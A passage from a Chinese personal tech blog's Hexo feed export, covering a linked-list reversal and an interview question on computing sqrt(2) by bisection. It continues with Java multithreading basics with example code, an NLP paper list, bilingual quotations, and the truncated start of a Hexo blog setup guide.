class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    node* prev=<span class="literal">NULL</span>;</span><br><span class="line">    node* pcur=head-&gt;next;</span><br><span class="line">    node* next;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(pcur!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pcur-&gt;next==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            pcur-&gt;next=prev;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        next=pcur-&gt;next;</span><br><span class="line">        pcur-&gt;next=prev;</span><br><span class="line">        prev=pcur;</span><br><span class="line">        pcur=next;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    head-&gt;next=pcur;</span><br><span class="line">    node*tmp=head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(tmp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;tmp-&gt;data&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">        tmp=tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-1-2-题目：已知-sqrt-2-约等于-1-414，要求不用数学库，求-sqrt-2-精确到小数点后-10-位。"><a href="#1-1-2-题目：已知-sqrt-2-约等于-1-414，要求不用数学库，求-sqrt-2-精确到小数点后-10-位。" class="headerlink" title="1.1.2 题目：已知 sqrt (2)约等于 1.414，要求不用数学库，求 sqrt (2)精确到小数点后 10 位。"></a>1.1.2 题目：已知 sqrt (2)约等于 1.414，要求不用数学库，求 sqrt (2)精确到小数点后 10 位。</h4><p>出题人：——阿里巴巴出题专家：文景／阿里云 CDN 资深技术专家</p><h4 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h4><ol><li>基础算法的灵活应用能力（二分法学过数据结构的同学都知道，但不一定往这个方向考虑；如果学过数值计算的同学，应该还要能想到牛顿迭代法并解释清楚）</li><li>退出条件设计</li></ol><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><ol><li><p>已知 sqrt(2)约等于 1.414，那么就可以在(1.4, 1.5)区间做二分<br>查找，如：<br>a) high=&gt;1.5<br>b) low=&gt;1.4<br>c) mid =&gt; (high+low)/2=1.45<br>d) 1.45*1.45&gt;2 ? high=&gt;1.45 : low =&gt; 1.45<br>e) 循环到 c)</p></li><li><p>退出条件<br>a) 前后两次的差值的绝对值&lt;=0.0000000001, 则可退出</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">const double EPSINON = 0.0000000001;</span><br><span class="line"></span><br><span class="line">double sqrt2( )&#123;</span><br><span class="line">    double low = 1.4, high = 1.5;</span><br><span class="line">    double mid = (low + high) / 2;</span><br><span class="line">    </span><br><span class="line">    while (high - low &gt; EPSINON)&#123;</span><br><span class="line">        if (mid*mid &gt; 2)&#123;</span><br><span class="line">            high = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            low = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        mid = (high + low) / 2;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-1-1-如何实现一个高效的单向链表逆序输出？&quot;&gt;&lt;a href=&quot;#1-1-1-如何实现一个高效的单向链表逆序输出？&quot; class=&quot;headerlink&quot; title=&quot;1.1.1 如何实现一个高效的单向链表逆序输出？&quot;&gt;&lt;/a&gt;1.1.1 如何实现一个高效
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Java的多线程-基础知识(1)</title>
    <link href="http://yoursite.com/2019/07/23/Java-multi-thread-note/"/>
    <id>http://yoursite.com/2019/07/23/Java-multi-thread-note/</id>
    <published>2019-07-23T10:22:20.000Z</published>
    <updated>2019-11-02T12:24:05.717Z</updated>
    
    <content type="html"><![CDATA[<p>今天整理一下java的多线程部分的基础知识</p><h3 id="废话篇"><a href="#废话篇" class="headerlink" title="废话篇"></a>废话篇</h3><p>今年7月中旬的时候从我的大学毕业了，这一段时间在家里带了几天娃，希望我的博客不倒，小外甥女长大能看到。（笑哭</p><p>前一段时间学习了Java的多线程，Java多线程编程的基础内容并不难，但是刚学完多线程我对这个多线程有了一些疑问——Java的多线程程序在计算机中究竟是怎么运行的呢？带着这个疑问开始了下面的探寻之路。</p><h3 id="Java多线程编程回顾"><a href="#Java多线程编程回顾" class="headerlink" title="Java多线程编程回顾"></a>Java多线程编程回顾</h3><p>java的多线程在Java8中总共有3种实现方式，即通过继承thread类，实现Runable接口，使用callable、线程池executor、future来创建可以返回值的线程。下面简单看一下这三者实现的一个demo。</p><h4 id="1、继承thread类来创建线程"><a href="#1、继承thread类来创建线程" class="headerlink" title="1、继承thread类来创建线程"></a>1、继承thread类来创建线程</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadMethod</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    ThreadMethod(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里通过重写Thread类的run()方法达到起多线程的目的</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            System.out.println(name + <span class="string">":"</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            sleep((<span class="keyword">int</span>) (Math.random() * <span class="number">10</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestMain1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里就起了两个线程，线程的代码顺序和线程的执行顺序无关</span></span><br><span class="line">        ThreadMethod threadClass1 = <span class="keyword">new</span> ThreadMethod(<span class="string">"AA"</span>);</span><br><span class="line">        ThreadMethod threadClass2 = <span class="keyword">new</span> ThreadMethod(<span class="string">"BB"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里可以通过调用run方法来看看线程和非线程的区别，如果是调用run方法时，得到的结果是顺序执行的，</span></span><br><span class="line">        <span class="comment">// 但是start()方法是线程执行的方法，因此如果用多线程的方法就要使用start()</span></span><br><span class="line">        <span class="comment">// 注意：start()方法的调用后并不是立即执行多线程代码，而是使得该线程变为可运行态（Runnable），什么时候运行是由操作系统决定的。</span></span><br><span class="line">        threadClass1.start();</span><br><span class="line">        threadClass2.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据Java的单继承模式（即一个类只能继承一个类），所以如果一个类继承Thread，则不适合资源共享。但是如果实现了Runable接口的话（因为java的接口是多继承关系，即一个类可以实现多个接口），这样则很容易的实现资源共享（<u><strong>这里的资源共享是什么意思</strong>？</u>）。</p><h4 id="2、实现Runable接口来创建线程"><a href="#2、实现Runable接口来创建线程" class="headerlink" title="2、实现Runable接口来创建线程"></a>2、实现Runable接口来创建线程</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RunnableThreadMethod</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    RunnableThreadMethod(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">"运行开始"</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            System.out.println(name + <span class="string">":"</span> + i);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i==<span class="number">8</span> &amp;&amp; Thread.currentThread().getName().equals(<span class="string">"Thread-0"</span>))&#123;</span><br><span class="line">                System.out.println(<span class="string">"yield start"</span>);</span><br><span class="line">                <span class="comment">// yield只是从程序上控制线程的运行状态，即将其在程序层面上转为可运行状态也就是就绪状态，但是硬件层面CPU调度还是有</span></span><br><span class="line">                <span class="comment">// 可能将同时处于可运行状态中的该线程拿出来跑。</span></span><br><span class="line">                Thread.yield();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            sleep((<span class="keyword">int</span>) (Math.random() * <span class="number">10</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">"运行结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestMain2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">"运行开始"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Thread2类通过实现Runnable接口，使得该类有了多线程类的特征。run（）方法是多线程程序的一个约定。</span></span><br><span class="line">        <span class="comment">// 所有的多线程代码都在run方法里面。Thread类实际上也是实现了Runnable接口的类。</span></span><br><span class="line">        RunnableThreadMethod runnableThreadMethod1 = <span class="keyword">new</span> RunnableThreadMethod(<span class="string">"C"</span>);</span><br><span class="line">        RunnableThreadMethod runnableThreadMethod2 = <span class="keyword">new</span> RunnableThreadMethod(<span class="string">"D"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在启动的多线程的时候，需要先通过Thread类的构造方法Thread(Runnable target) 构造出对象，</span></span><br><span class="line">        <span class="comment">// 然后调用Thread对象的start()方法来运行多线程代码。</span></span><br><span class="line">        <span class="comment">// 实际上所有的多线程代码都是通过运行Thread的start()方法来运行的。因此，不管是扩展Thread类还是</span></span><br><span class="line">        <span class="comment">// 实现Runnable接口来实现多线程，最终还是通过Thread的对象的API来控制线程的，熟悉Thread类的API是进行多线程编程的基础。</span></span><br><span class="line">        Thread thread1 = <span class="keyword">new</span> Thread(runnableThreadMethod1);</span><br><span class="line">        thread1.start();</span><br><span class="line">        <span class="keyword">new</span> Thread(runnableThreadMethod2).start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            thread1.join();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">"运行结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、使用call、线程池executor、future来创建可以返回值的线程"><a href="#3、使用call、线程池executor、future来创建可以返回值的线程" class="headerlink" title="3、使用call、线程池executor、future来创建可以返回值的线程"></a>3、使用call、线程池executor、future来创建可以返回值的线程</h4><p>如果对一些场合需要线程返回的结果。就要使用用Callable、Future、FutureTask、CompletionService这几个类。Callable只能在ExecutorService的线程池中跑，但有返回结果，也可以通过返回的Future对象查询执行状态。<br>Future 本身也是一种设计模式，它是用来取得异步任务的结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallThreadMethod</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">CallThread</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String taskName;</span><br><span class="line"></span><br><span class="line">        CallThread(String name) &#123;</span><br><span class="line">            <span class="keyword">this</span>.taskName = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">" start"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            Date date1 = <span class="keyword">new</span> Date();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                sum = sum + i;</span><br><span class="line">                System.out.println(taskName + <span class="string">":"</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">            Date date2 = <span class="keyword">new</span> Date();</span><br><span class="line">            <span class="keyword">long</span> time = date2.getTime() - date1.getTime();</span><br><span class="line"></span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">" end"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> taskSize = <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// 创建一个线程池</span></span><br><span class="line">        ExecutorService executorServicePool = Executors.newFixedThreadPool(taskSize);</span><br><span class="line">        <span class="comment">// 创建具有返回值的任务</span></span><br><span class="line">        Callable callThreadMethod1 = <span class="keyword">new</span> CallThread(<span class="string">"AAa"</span>);</span><br><span class="line">        Callable callThreadMethod2 = <span class="keyword">new</span> CallThread(<span class="string">"BBA"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// way-1:执行任务并获取 Future对象</span></span><br><span class="line">        Future future1 = executorServicePool.submit(callThreadMethod1);</span><br><span class="line">        Future future2 = executorServicePool.submit(callThreadMethod1);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"通过方式1获得的10的和为："</span> + future1.get().toString());</span><br><span class="line">        System.out.println(<span class="string">"通过方式1获得的10的和为："</span> + future2.get().toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// =============================================</span></span><br><span class="line">        <span class="comment">// way-2 通过invokeAll执行任务</span></span><br><span class="line">        List&lt;Future&lt;Object&gt;&gt; futureList = executorServicePool.invokeAll(asList(<span class="keyword">new</span> CallThread(<span class="string">"AAAA"</span>), <span class="keyword">new</span> CallThread(<span class="string">"BBB"</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭线程池</span></span><br><span class="line">        executorServicePool.shutdown();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Future&lt;Object&gt; item : futureList) &#123;</span><br><span class="line">            System.out.println(<span class="string">"通过方式2获得的结果："</span>+item.get());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面再说一说这三者的共同点和差异。</p><p>1、继承thread类和实现runnable接口的两种方式最终都是通过调用thread类的start方法启动线程的；<br>2、前两者(thread、runnable)都不能返回结果；<br>3、runnable实现的多线程 最终还是归一到thread上，这就表明runnable实现的多线程对象的方法是和thread实现的多线程对象的方法api是一致的；<br>4、单继承机制导致多线程类不能继承多个类，而runnable是一个接口类，因此可以实现类继承一个类和多个接口；<br>5、call方法可以返回结果，是使用了线程池，是继承了callable()接口，因此可以像runnable方法一样实现继承多个类。<br>6、call方法开启线程有两种方式，一种是使用submit方法接收CallThread的具体对象，一种是使用invokeAll方法接收一个CallThread对象列表。</p><p>如果需要线程返回结果，那么就选择call方式；如果不需要结果，那么有两种选择，那么建议使用runnable或者call方式。</p><h3 id="Java多线程的进一步思考"><a href="#Java多线程的进一步思考" class="headerlink" title="Java多线程的进一步思考"></a>Java多线程的进一步思考</h3><p>针对java的多线程，是不是这样写出来的代码就一定是并行运行的？</p><p>回想了操作系统相关的知识，进程是操作系统分配资源的最小单位，线程是操作系统调度的最小单位，那么就是说CPU资源是按照线程进行调度的，我们再回到目前的多核多线程的概念中去，目前购买CPU的时候，都会有一个双核4线程、4核8线程这种说法，就是说一个线程运行在CPU的核心上，这样的一般都是一个核心上运行2个线程。对于4核4线程，意味着该CPU可以同时运行4个线程，就是我们写一个4线程程序的时候，如果只有这一个程序使用，理想情况下CPU会全部为该程序服务。也就是说程序（进程）并发，线程在多核心CPU上是并行运行的，多线程程序在单核心单线程的CPU上是并发运行的。</p><p>Google一下“CPU多核多线程”keyword，可以搜到一堆关于这方面的讨论，不清楚的话可以多看几篇文章。</p><hr><p>项目的源码已开放在github上，项目地址：<a href="https://github.com/flowerlake/java-learning" target="_blank" rel="noopener">https://github.com/flowerlake/java-learning</a> ，这个项目包含了学习java的所有代码，感谢star。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li><a href="https://blog.csdn.net/evankaka/article/details/51610635" target="_blank" rel="noopener">Java并发编程与技术内幕:Callable、Future、FutureTask、CompletionService</a></li><li><a href="https://blog.csdn.net/evankaka/article/details/44153709" target="_blank" rel="noopener">Java多线程学习（吐血超详细总结）</a></li><li><a href="https://www.zhihu.com/question/269329998" target="_blank" rel="noopener">关于多线程编程和CPU多核多线程的关系？</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天整理一下java的多线程部分的基础知识&lt;/p&gt;
&lt;h3 id=&quot;废话篇&quot;&gt;&lt;a href=&quot;#废话篇&quot; class=&quot;headerlink&quot; title=&quot;废话篇&quot;&gt;&lt;/a&gt;废话篇&lt;/h3&gt;&lt;p&gt;今年7月中旬的时候从我的大学毕业了，这一段时间在家里带了几天娃，希望我的博
      
    
    </summary>
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>nlp经典论文整理（持续更新）</title>
    <link href="http://yoursite.com/2019/05/24/nlp-paper/"/>
    <id>http://yoursite.com/2019/05/24/nlp-paper/</id>
    <published>2019-05-24T08:50:20.000Z</published>
    <updated>2019-05-27T07:24:29.836Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要整理一下在自然语言处理领域的一些经典paper和优质的文章。</p><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><ul><li><a href="https://blog.csdn.net/qq_39521554/article/details/83062188" target="_blank" rel="noopener">NLP自然语言处理谷歌：BERT模型深度解析</a></li></ul><h3 id="paper"><a href="#paper" class="headerlink" title="paper"></a>paper</h3><ul><li>海量语料获取的方式：《A Neural Probabilistic Language Model》</li><li>Transformer模型的发明：《Attention Is All You Need》</li><li>对于Mask（遮挡）在语言模型上的应用<a href="https://arxiv.org/abs/1703.02573" target="_blank" rel="noopener">Data Noising as Smoothing in Neural Network Language Models</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文主要整理一下在自然语言处理领域的一些经典paper和优质的文章。&lt;/p&gt;
&lt;h3 id=&quot;文章&quot;&gt;&lt;a href=&quot;#文章&quot; class=&quot;headerlink&quot; title=&quot;文章&quot;&gt;&lt;/a&gt;文章&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.
      
    
    </summary>
    
      <category term="自然语言处理" scheme="http://yoursite.com/categories/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86/"/>
    
    
      <category term="nlp" scheme="http://yoursite.com/tags/nlp/"/>
    
  </entry>
  
  <entry>
    <title>iridescent sentences</title>
    <link href="http://yoursite.com/2019/05/15/iridescent-sentence/"/>
    <id>http://yoursite.com/2019/05/15/iridescent-sentence/</id>
    <published>2019-05-14T16:00:00.000Z</published>
    <updated>2019-05-15T00:50:48.917Z</updated>
    
    <content type="html"><![CDATA[<p>我们总是喜欢拿“顺其自然”来敷衍人生路上的荆棘坎坷，却很少承认，真正的顺其自然，其实是竭尽所能之后的不强求，而非两手一摊的不作为。</p><p>Instead of admitting that the truth of “let it be” is to readily accept any kinds of outcome after making full efforts rather than to do noting at the very begining,we’d rather take “let it be” as an excuse to evade the path of thorns in out life.</p><hr><p>少一些功利主义的追求，多一些不为什么的坚持。</p><p>Less interests, More interest.</p><hr><p>你也许不是她的初恋，也许不会成为她的归宿、她的唯一。她爱过别人，也可能会有别的爱人。但她现在爱着你，其他的一切又算什么呢？她是个有缺点的女孩，而你也并不完美。你们俩在一起也许永远不会是珠联璧合。但如果她能引你大笑，能激发你重新思考，能让你承认自己是会犯错的凡人。那么请抓紧她，不要放手，给她你所能给的所有。她也许不是每分每秒都在想你，但她把自己最脆弱的那部分给了你——她的心。所以，请别伤害她，改变她，揣摩她，别期望她给你能力之外的东西。当她让你快乐时，请向她微笑；当她让你抓狂时，请让她知晓；当她不在你的身旁时，请深深地思念她。</p><p>“You may not be her first, her last, or her only. She loved before she may love again. But if she loves you now, what else matters? She’s not perfect—you aren’t either, and the two of you may never be perfect together but if she can make you laugh, cause you to think twice, and admit to being human and making mistakes, hold onto her and give her the most you can. She may not be thinking about you every second of the day, but she will give you a part of her that she knows you can break—her heart. So don’t hurt her, don’t change her, don’t analyze and don’t expect more than she can give. Smile when she makes you happy, let her know when she makes you mad, and miss her when she’s not there.”</p><hr><p>there are two kinds of pain:the sort of pain that makes you strong or useless pain.</p><p>世间有两种痛苦，一种让你更为强大，另一种毫无价值。</p><hr><p>I realize it’s all right that the world is crazy as long as I make my little corner of the world sane.</p><p>我意识到这个世界有多疯狂都没有关系，只要我自己的小天地正常就行了。</p><hr><p>Good artists copy，Great artists steal.</p><p>能工摹形、巧匠窃意。</p><hr><p>Even a cursory glance at the figures will tell you that sales are down.</p><p><strong>题外话</strong><br>作为一个伪文艺青年，不会写代码的程序员，经常会摘录下这些优美的句子，或激励自己，或充实自己。在有些困境下，确实会激发我的996（逃。同是一萍年少人，在评论区留下那些使你力量强大的诗句吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我们总是喜欢拿“顺其自然”来敷衍人生路上的荆棘坎坷，却很少承认，真正的顺其自然，其实是竭尽所能之后的不强求，而非两手一摊的不作为。&lt;/p&gt;
&lt;p&gt;Instead of admitting that the truth of “let it be” is to readily
      
    
    </summary>
    
      <category term="闲言碎语" scheme="http://yoursite.com/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"/>
    
    
  </entry>
  
  <entry>
    <title>使用hexo+github+Next搭建个人博客网站</title>
    <link href="http://yoursite.com/2019/05/14/hexo-next-blog/"/>
    <id>http://yoursite.com/2019/05/14/hexo-next-blog/</id>
    <published>2019-05-14T11:30:20.000Z</published>
    <updated>2019-05-16T02:57:33.208Z</updated>
    
    <content type="html"><![CDATA[<p>最近做毕业设计做的有点累，好久没写博客了，写篇博客放松一下。最近面临毕业了，之前在腾讯云搭建的个人站点，服务器也不能使用学生优惠的价格购买了，遂在今天借这个机会把博客迁移到github上来。之前有一次自己的云服务器的数据库被撞库了，又没有备份，丢失了很多的文章，也是心痛。使用hexo部署到github上就很好的避免了这个问题。整体上来说，hexo和Next的文档也是很丰富详细的，下面记录一下搭建部署的一些细节问题。</p><p>注：使用hexo搭建博客就意味着你今后就要使用 Markdown 来写作了。Markdown的通用语法很简单，可以将其认为是html的一种变体（实际上就是html的变体，因此可以在Markdown文件中使用部分html标签）。Markdown的语法一般来说半个小时不到就能学会了（<a href="https://www.markdownguide.org/basic-syntax" target="_blank" rel="noopener">makrdown basic-syntax</a>），只要用Markdown写上两篇文章，基本上就得心应手了。这里顺带着推荐一个编辑器 Typora，无论是macOS还是Windows下该软件的表现都不错，而且对于 LaTeX 和 Code支持的比较好（这个是我推荐Typora的重点）。</p><h2 id="一、本地搭建hexo和Next"><a href="#一、本地搭建hexo和Next" class="headerlink" title="一、本地搭建hexo和Next"></a>一、本地搭建hexo和Next</h2><p>现在hexo的官方文档已经很完善了，并且也支持多种语言，一般来说都没什么大的问题。我参考着<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">hexo的官方文档</a>基本上就把hexo搭建好了。这里我想说一下，能参考官方文档就尽量看官方文档，现在网上很多的博客文章时间发表的都有些时段了，而官网文档是系统运行的最基本的参考。把hexo搭建好之后就可以在某个空白文件夹下初始化hexo项目。我相信大家到这里应该都没什么问题。</p><p><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">hexo官方文档</a></p><p><a href="https://theme-next.iissnan.com/getting-started.html" target="_blank" 